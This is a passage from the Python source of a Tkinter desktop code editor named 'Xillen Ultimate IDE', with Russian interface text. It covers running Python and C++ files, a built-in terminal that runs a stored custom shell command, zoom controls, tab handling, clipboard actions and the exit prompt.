                target=self.execute_custom_command, 
                args=(self.custom_command,),
                daemon=True
            ).start()
            
            self.status_label.config(text="Кастомная команда запущена!")
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось выполнить команду:\n{str(e)}")
        # ========================================
    
    # Новый метод для выполнения кастомной команды
    def execute_custom_command(self, command):
        try:
            cwd = os.getcwd()
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                cwd=cwd
            )
            
            output = result.stdout if result.stdout else result.stderr
            if output:
                self.terminal.terminal.insert("end", f"\n{output}")
        except Exception as e:
            self.terminal.terminal.insert("end", f"\nОшибка: {str(e)}")
        finally:
            # Добавляем новое приглашение
            self.terminal.terminal.insert("end", "\n>>> ")
            self.terminal.terminal.mark_set("input", "end")
            self.terminal.terminal.see("end")
    
    def run_current_file(self):
        tab_data = self.get_current_tab_data()
        if not tab_data or not tab_data["path"]:
            self.terminal.terminal.insert("end", "\nОшибка: Файл не сохранен")
            self.terminal.terminal.see("end")
            return
            
        try:
            ext = os.path.splitext(tab_data["path"])[1].lower()
            if ext == ".py":
                threading.Thread(target=self.run_python_file, args=(tab_data["path"],), daemon=True).start()
            elif ext in [".cpp", ".c", ".cc", ".cxx"]:
                threading.Thread(target=self.run_cpp_file, args=(tab_data["path"],), daemon=True).start()
            else:
                self.terminal.terminal.insert("end", f"\nНеподдерживаемый тип файла: {ext}")
                self.terminal.terminal.see("end")
        except Exception as e:
            self.terminal.terminal.insert("end", f"\nОшибка выполнения: {str(e)}")
            self.terminal.terminal.see("end")
    
    def run_python_file(self, path):
        self.status_label.config(text="Выполнение Python файла...")
        try:
            process = subprocess.Popen(
                ["python", path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    self.terminal.terminal.insert("end", output)
                    self.terminal.terminal.see("end")
            
            stdout, stderr = process.communicate()
            if stdout:
                self.terminal.terminal.insert("end", stdout)
            if stderr:
                self.terminal.terminal.insert("end", stderr)
                
            self.terminal.terminal.see("end")
            self.status_label.config(text="Готово")
        except Exception as e:
            self.terminal.terminal.insert("end", f"\nОшибка: {str(e)}")
            self.terminal.terminal.see("end")
            self.status_label.config(text="Ошибка выполнения")
    
    def run_cpp_file(self, path):
        self.status_label.config(text="Компиляция C++ файла...")
        try:
            output_file = os.path.splitext(path)[0]
            if platform.system() == "Windows":
                output_file += ".exe"
            
            compile_process = subprocess.run(
                ["g++", path, "-o", output_file],
                capture_output=True,
                text=True
            )
            
            if compile_process.returncode != 0:
                self.terminal.terminal.insert("end", f"\nОшибка компиляции:\n{compile_process.stderr}")
                self.terminal.terminal.see("end")
                return
            
            self.status_label.config(text="Выполнение C++ файла...")
            run_process = subprocess.Popen(
                [output_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            while True:
                output = run_process.stdout.readline()
                if output == '' and run_process.poll() is not None:
                    break
                if output:
                    self.terminal.terminal.insert("end", output)
                    self.terminal.terminal.see("end")
            
            stdout, stderr = run_process.communicate()
            if stdout:
                self.terminal.terminal.insert("end", stdout)
            if stderr:
                self.terminal.terminal.insert("end", stderr)
                
            self.terminal.terminal.see("end")
            self.status_label.config(text="Готово")
        except Exception as e:
            self.terminal.terminal.insert("end", f"\nОшибка: {str(e)}")
            self.terminal.terminal.see("end")
            self.status_label.config(text="Ошибка выполнения")
    
    def run_project(self):
        if self.project_path:
            self.terminal.terminal.insert("end", f"\nЗапуск проекта: {os.path.basename(self.project_path)}")
            self.status_label.config(text="Запуск проекта")
        else:
            messagebox.showinfo("Информация", "Сначала откройте папку проекта")
    
    def run_without_debug(self):
        self.run_current_file()
    
    def stop_execution(self):
        self.status_label.config(text="Выполнение остановлено")
        self.terminal.terminal.insert("end", "\n[Отладка] Выполнение остановлено")
    
    def clear_terminal(self):
        self.terminal.clear()
    
    def new_terminal(self):
        self.terminal.terminal.insert("end", "\n--- Новый терминал ---\n")
        self.terminal.terminal.insert("end", ">>> ")
        self.terminal.terminal.mark_set("input", "end")
        self.terminal.terminal.see("end")
    
    def toggle_sidebar(self):
        self.sidebar_visible = not self.sidebar_visible
        if self.sidebar_visible:
            self.sidebar_frame.pack(fill=tk.BOTH, expand=True)
        else:
            self.sidebar_frame.pack_forget()
    
    def toggle_terminal(self):
        self.terminal_visible = not self.terminal_visible
        if self.terminal_visible:
            self.terminal_frame.pack(fill=tk.BOTH, expand=True)
        else:
            self.terminal_frame.pack_forget()
    
    def zoom_in(self):
        if self.zoom_level < 5:
            self.zoom_level += 1
            self.font_size += 1
            
            for tab_id, tab_data in self.tabs.items():
                tab = tab_data["tab"]
                tab.text.configure(font=(self.font_family, self.font_size))
                tab.gutter.configure(font=(self.font_family, self.font_size))
                tab.update_gutter()
            
            self.terminal.terminal.configure(font=(self.font_family, self.font_size - 1))
            
            self.update_status_bar()
    
    def zoom_out(self):
        if self.zoom_level > -5 and self.font_size > 8:
            self.zoom_level -= 1
            self.font_size -= 1
            
            for tab_id, tab_data in self.tabs.items():
                tab = tab_data["tab"]
                tab.text.configure(font=(self.font_family, self.font_size))
                tab.gutter.configure(font=(self.font_family, self.font_size))
                tab.update_gutter()
            
            self.terminal.terminal.configure(font=(self.font_family, self.font_size - 1))
            
            self.update_status_bar()
    
    def zoom_reset(self):
        self.zoom_level = 0
        self.font_size = 14
        
        for tab_id, tab_data in self.tabs.items():
            tab = tab_data["tab"]
            tab.text.configure(font=(self.font_family, self.font_size))
            tab.gutter.configure(font=(self.font_family, self.font_size))
            tab.update_gutter()
        
        self.terminal.terminal.configure(font=(self.font_family, self.font_size - 1))
        
        self.update_status_bar()
    
    def undo(self):
        tab_data = self.get_current_tab_data()
        if tab_data:
            try:
                tab_data["tab"].text.edit_undo()
            except:
                pass
    
    def redo(self):
        tab_data = self.get_current_tab_data()
        if tab_data:
            try:
                tab_data["tab"].text.edit_redo()
            except:
                pass
    
    def cut(self):
        tab_data = self.get_current_tab_data()
        if tab_data:
            tab_data["tab"].text.event_generate("<<Cut>>")
    
    def copy(self):
        tab_data = self.get_current_tab_data()
        if tab_data:
            tab_data["tab"].text.event_generate("<<Copy>>")
    
    def paste(self):
        tab_data = self.get_current_tab_data()
        if tab_data:
            tab_data["tab"].text.event_generate("<<Paste>>")
    
    def show_search(self):
        messagebox.showinfo("Поиск", "Функция поиска будет реализована в следующей версии")
    
    def show_replace(self):
        messagebox.showinfo("Замена", "Функция замены будет реализована в следующей версии")
    
    def show_about(self):
        about = """
        Xillen Ultimate IDE
        
        Профессиональная среда разработки
        
        Версия: 4.0 Premium
        Авторы: 
          @BengaminButton (Telegram)
          @XillenAdapter (Telegram)
        
        © 2024 XillenKillers. Все права защищены.
        """
        messagebox.showinfo("О программе", about.strip())
    
    def update_cursor_position(self, event=None):
        tab_data = self.get_current_tab_data()
        if not tab_data:
            return
            
        cursor_pos = tab_data["tab"].text.index(tk.INSERT)
        line, col = cursor_pos.split('.')
        self.current_line = int(line)
        self.current_col = int(col)
        self.line_label.config(text=f"Ln {line}, Col {col}")
    
    def update_status_bar(self, event=None):
        self.update_cursor_position()
        self.zoom_label.config(text=f"{100 + self.zoom_level * 10}%")
        
        tab_data = self.get_current_tab_data()
        if tab_data and tab_data["path"]:
            self.status_label.config(text=f"Файл: {os.path.basename(tab_data['path'])}")
        else:
            self.status_label.config(text="Готово")
    
    def update_tab_title(self):
        for tab_id, tab_data in self.tabs.items():
            title = tab_data["filename"]
            if tab_data["unsaved"]:
                title += " *"
            self.notebook.tab(tab_data["frame"], text=title)
    
    def on_tab_changed(self, event):
        tab_id = self.get_current_tab_id()
        if tab_id:
            self.current_tab = tab_id
            tab_data = self.tabs[tab_id]
            self.update_status_bar()
            
            if tab_data["path"]:
                self.current_file = tab_data["path"]
                self.root.title(f"{tab_data['path']} - Xillen Ultimate IDE")
                self.status_label.config(text=f"Файл: {os.path.basename(tab_data['path'])}")
    
    def get_current_tab_id(self):
        current_tab = self.notebook.select()
        if not current_tab:
            return None
        
        for tab_id, tab_data in self.tabs.items():
            if tab_data["frame"] == current_tab:
                return tab_id
        return None
    
    def get_current_tab_data(self):
        tab_id = self.get_current_tab_id()
        if tab_id:
            return self.tabs[tab_id]
        return None
    
    def close_current_tab(self):
        tab_id = self.get_current_tab_id()
        if not tab_id:
            return
            
        tab_data = self.tabs[tab_id]
        
        if tab_data["unsaved"]:
            if not messagebox.askyesno(
                "Сохранить изменения?",
                f"Сохранить изменения в файле {tab_data['filename']}?"
            ):
                self.notebook.forget(tab_data["frame"])
                del self.tabs[tab_id]
                return
        
        self.save_file()
        self.notebook.forget(tab_data["frame"])
        del self.tabs[tab_id]
        
        if not self.tabs:
            self.new_file()
    
    def exit_app(self):
        unsaved = []
        for tab_id, tab_data in self.tabs.items():
            if tab_data["unsaved"]:
                unsaved.append(tab_data["filename"] or "Новый файл")
        
        if unsaved:
            response = messagebox.askyesnocancel(
                "Несохраненные изменения",
                "Сохранить изменения перед выходом?\n\n" + "\n".join(unsaved)
            )
            if response is None:
                return
            if response:
                self.save_all()
        
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = XillenUltimateIDE(root)
    root.mainloop()